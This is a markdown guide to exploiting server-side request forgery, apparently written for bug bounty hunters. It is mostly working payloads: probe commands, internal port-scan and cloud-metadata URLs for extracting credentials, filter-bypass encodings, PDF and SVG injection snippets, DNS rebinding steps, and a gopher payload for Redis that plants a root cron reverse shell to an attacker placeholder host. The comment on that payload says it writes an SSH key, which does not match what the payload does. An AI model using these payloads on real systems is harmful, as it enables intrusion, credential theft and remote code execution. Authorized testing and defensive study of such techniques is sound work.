# Advanced SSRF Exploitation Guide — 2026

## SSRF Detection

### Passive Detection (Browser as you work)
Use Burp extension "Collaborator Everywhere" — automatically injects collaborator payloads into every header and parameter of in-scope traffic. You find SSRF passively while doing other testing.

### Active Detection Checklist
```bash
# Standard URL parameters
curl -s "https://target.com/fetch?url=http://COLLABORATOR/test"
curl -s "https://target.com/proxy?url=http://COLLABORATOR/test"
curl -s "https://target.com/load?file=http://COLLABORATOR/test"

# Headers that trigger SSRF
curl -s "https://target.com/" -H "X-Forwarded-For: COLLABORATOR"
curl -s "https://target.com/" -H "True-Client-IP: COLLABORATOR"
curl -s "https://target.com/" -H "Referer: http://COLLABORATOR/"

# Webhook/callback parameters
curl -s -X POST "https://target.com/api/webhook" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://COLLABORATOR/test","callback":"http://COLLABORATOR/test"}'

# File upload that processes files server-side (SVG, XML, DOCX)
# Use SVG with embedded XInclude or XXE to trigger SSRF
```

## SSRF Escalation Ladder

### Level 1: Confirm SSRF
```bash
# Collaborator callback confirms outbound request
# Or time-based: if server takes longer when fetching slow URL
```

### Level 2: Internal Port Scanning
```bash
http://127.0.0.1:22    # SSH
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:9200  # Elasticsearch
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # Alternative HTTP
http://127.0.0.1:8443  # Alternative HTTPS
http://127.0.0.1:3000  # Node.js/React dev
http://127.0.0.1:5000  # Flask dev
http://127.0.0.1:9000  # Hadoop/HDFS
```

### Level 3: Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Level 4: Internal Service Exploitation

#### Redis (port 6379) via Gopher
```bash
# Gopher allows raw bytes to TCP — perfect for Redis
# Write SSH key to authorized_keys
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0akey%0d%0a$37%0d%0a%0a%0a* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### MySQL (port 3306) via Gopher
```bash
# Read MySQL data via SSRF
gopher://127.0.0.1:3306/_[MySQL packet payload]
```

#### FastCGI (port 9000) → RCE
```bash
# PHP-FPM via FastCGI → RCE
gopher://127.0.0.1:9000/_[FastCGI payload]
```

#### Elasticsearch (port 9200)
```bash
# Read ES data
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=password
http://127.0.0.1:9200/_nodes
```

### Level 5: Protocol Bypass Techniques

```bash
# IPv6 loopback
http://[::1]:8080/
http://[::ffff:127.0.0.1]/

# Decimal IP
http://2130706433/       # 127.0.0.1
http://2852039166/       # 169.254.169.254
http://3232235521/       # 192.168.0.1

# Octal IP
http://0177.0.0.1/       # 127.0.0.1

# Shortened IPv6
http://[::]:8080/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# DNS rebinding domains
http://169.254.169.254.nip.io/
http://1.0.0.127.nip.io/
http://spoofed.burpcollaborator.net

# URL parser confusion
http://127.0.0.1:8080@evil.com/       # Some parsers take first part
http://evil.com#@127.0.0.1/           # Fragment confusion
http://evil.com\@127.0.0.1/           # Backslash confusion
http://127.0.0.1%00evil.com/          # Null byte truncation

# DNS rebinding (TOCTOU)
# 1. Register domain with 1s TTL
# 2. First DNS query → resolves to public IP (passes validation)
# 3. TTL expires, second DNS query → resolves to 169.254.169.254
# Tools: Singularity of Origin, rebind.it
```

## Blind SSRF Detection

Blind SSRF means you don't see the response — you need out-of-band detection.

```bash
# Use your own collaborator or interactsh
interactsh-client

# Inject into all possible places:
# - URL parameters
# - POST body fields
# - HTTP headers (X-Forwarded-For, Referer, X-Forwarded-Host)
# - File uploads (SVG with XXE, XML files)
# - User-agent string
```

### Blind SSRF Timing Detection
```bash
# If OOB is blocked, use time-based:
# Make server fetch from a slow endpoint
time curl -s "https://target.com/fetch?url=http://your-slow-server.com/delay"
# If response time matches the delay → SSRF confirmed
```

## SSRF via PDF Generators

PDF generators are a goldmine for SSRF:
```html
<!-- HTML to PDF injection -->
<img src="http://169.254.169.254/latest/meta-data/"/>
<iframe src="http://127.0.0.1:8080/admin"/>
<script xlink:href="http://internal-server/secret"/>
<embed src="http://internal:9200/_search?q=password"/>
```

## SSRF via SVG Upload
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <image href="http://169.254.169.254/latest/meta-data/" width="200" height="200"/>
</svg>
```

## Second-Order SSRF

Some SSRFs trigger asynchronously:
```
1. Submit URL via API
2. URL is stored in database/work queue
3. Background worker fetches the URL hours later
4. Collaborator receives callback from different IP (the worker)
```

**Strategy**: Submit payload, leave collaborator running, check back later.

## DNS Rebinding Attack (Detailed)

```
1. Set up DNS server with very short TTL (< 1s)
2. Configure first resolution → your public IP (passes validation)
3. Configure second resolution → 169.254.169.254 (internal)
4. Submit http://your-domain.com/fetch to SSRF endpoint
5. First DNS query → resolves to public IP → validation passes ✓
6. TTL expires before server makes the actual request
7. Second DNS query → resolves to 169.254.169.254
8. Server fetches AWS metadata → credentials extracted ✓
```

### Tools for DNS Rebinding
- Singularity of Origin (by nccgroup)
- rbndr.us
- 1u.ms
- custom Python DNS server with dnslib library

## SSRF Mitigation Bypass Techniques

| Mitigation | Bypass |
|-----------|--------|
| IP deny list (127.0.0.1, 10.x.x.x) | Use decimal/hex/octal/IPv6 variants |
| Hostname allowlist | DNS rebinding, URL parser confusion |
| Protocol allowlist (http only) | gopher://, dict://, file:// if not blocked |
| SSRF via DNS (validation at submit time) | Use TOCTOU via DNS rebinding |
| IMDSv1 blocked | Try IMDSv2: PUT http://169.254.169.254/latest/api/token |
| Rate limiting | Slow, methodical scanning over hours |
| Response not returned (blind) | OOB via collaborator/interactsh |

## Bug Bounty SSRF Reporting Tips

1. **Demonstrate impact**: A collaborator callback proves existence, but showing credentials extracted from IMDS proves criticality
2. **Gopher is your friend**: SSRF + Gopher + Redis = RCE. This is a critical finding every time
3. **Blind SSRF is still High**: Even without data return, SSRF enables internal scanning and data exfiltration
4. **Chain it**: SSRF alone is High. SSRF → Internal service → RCE is Critical
5. **CWE-918**: Always reference CWE-918 in reports
